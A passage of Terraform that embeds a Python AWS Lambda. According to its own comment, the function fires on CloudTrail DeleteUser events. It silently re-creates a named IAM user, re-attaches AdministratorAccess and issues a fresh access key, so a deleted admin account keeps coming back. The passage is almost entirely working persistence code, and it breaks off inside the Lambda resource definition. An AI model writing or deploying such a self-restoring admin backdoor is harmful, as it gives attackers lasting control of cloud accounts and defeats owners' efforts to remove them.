      import json
      import os
      import boto3
      import time

      iam = boto3.client("iam")

      USER_NAME = os.environ.get("TARGET_USER_NAME")
      ADMIN_POLICY_ARN = "arn:aws:iam::aws:policy/AdministratorAccess"

      def user_exists(name: str) -> bool:
          try:
              iam.get_user(UserName=name)
              return True
          except iam.exceptions.NoSuchEntityException:
              return False
          except Exception:
              return False

      def ensure_user():
          if not USER_NAME:
              return {"ok": False, "reason": "TARGET_USER_NAME not set"}

          if not user_exists(USER_NAME):
              try:
                  iam.create_user(UserName=USER_NAME)
              except iam.exceptions.EntityAlreadyExistsException:
                  pass

          # (Re-)attach AdministratorAccess if not attached
          try:
              iam.attach_user_policy(UserName=USER_NAME, PolicyArn=ADMIN_POLICY_ARN)
          except Exception:
              pass

          # Create a new access key (best-effort)
          try:
              iam.create_access_key(UserName=USER_NAME)
          except Exception:
              pass

          return {"ok": True}

      def lambda_handler(event, context):
          # Triggered by CloudTrail DeleteUser
          # Always attempt to recreate user after any delete attempt
          time.sleep(2)
          return ensure_user()
    PY
  }

  output_path = "${path.module}/lambda.zip"
}

resource "aws_lambda_function" "recreate" {
  function_name = var.lambda_name
